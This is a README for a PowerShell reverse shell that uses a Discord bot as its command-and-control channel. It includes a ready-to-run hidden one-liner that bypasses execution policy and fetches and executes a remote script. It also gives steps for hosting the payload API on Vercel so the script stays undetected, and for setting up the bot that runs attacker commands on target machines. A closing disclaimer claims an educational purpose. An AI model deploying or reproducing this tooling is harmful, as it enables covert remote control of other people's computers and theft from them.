![banner](/src/banner.png)
# X Shell

X Shell is a PowerShell-based reverse shell that uses a Discord server as its command-and-control (C2) infrastructure. It dynamically creates a dedicated Discord channel for each user who executes the script, allowing for organized command execution and response tracking.

## How It Works
Revshell X consists of three main components:

### 1. **PowerShell Dropper**
Windows 11 limits certain execution options, such as `-windowStyle hidden` when run from the Run dialog (`Win + R`). To bypass this, Revshell X uses a lightweight **dropper**. This dropper retrieves the actual PowerShell script from a remote API and executes it.

To deploy the reverse shell on a target machine, simply execute the following PowerShell command:
```powershell
powershell -W Hidden -Exec Bypass -c "$r = iwr https://xyz.vercel.app/ -H @{'Authorization'='Bearer xyzxyz'}; iex $r.Content"
```
This command downloads and executes the dropper, which in turn fetches and runs the main script.

### 2. **Backend API**
The backend API authenticates requests and responds with the full PowerShell script when properly requested. This allows the script to remain undetected on the target machine until execution. The API is responsible for:
- Serving the **dropper script** upon request.
- Returning the **full reverse shell script** to authenticated requests.

#### **Deploying the API**
The full API code is located under the `/API/` directory. To deploy it, follow these steps:
1. **Create a private GitHub repository** and upload all files from the `/API/` directory.
2. **Deploy to Vercel** by linking your GitHub repository to [Vercel](https://vercel.com/).
3. **Update `index.js` in the API**:
    - Modify **lines 27 and 28** to set authentication tokens.
    - Modify **lines 30 and 35** to return the correct PowerShell script.
4. **Deploy the API** and note the generated URL.

### 3. **Discord C2 Server**
The core reverse shell logic uses a **Discord bot** to communicate with a designated **Discord server**. When the script runs, it:
- Creates a new **private channel** in a predefined category.
- Reads messages from the channel for incoming commands.
- Executes the received PowerShell commands on the target machine.
- Returns command output back to the channel.

## Requirements
To set up Revshell X, you will need:
- A **Discord server**
- A **Discord bot** with appropriate permissions
- The **Channel ID** and **Category ID** where channels will be created
- The **API URL** for the dropper

## Installation & Setup
1. **Create a Discord bot**
    - Go to the [Discord Developer Portal](https://discord.com/developers/applications)
    - Create a new bot and get its **token**
    - Assign necessary permissions (Manage Channels, Read Messages, Send Messages, etc.)

2. **Set up the API**
    - Deploy the API using the steps mentioned above.
    - Ensure the API logs or restricts access securely.

3. **Modify the script with your bot details**
    - Update `$t`, `$s`, and `$categoryID` in the script.

4. **Deploy the dropper**
    - Use the provided PowerShell one-liner to execute the dropper.

## [Discord Server Template](https://discord.new/AFkzNqmAdmex)
For convenience, a preconfigured **Discord server template** is provided, which includes:
- A category for dynamically created channels
- Logging channels (optional)

## Disclaimer
This tool is intended for **educational and authorized testing purposes only**. Unauthorized use of this software is illegal and may result in criminal charges. Use responsibly.

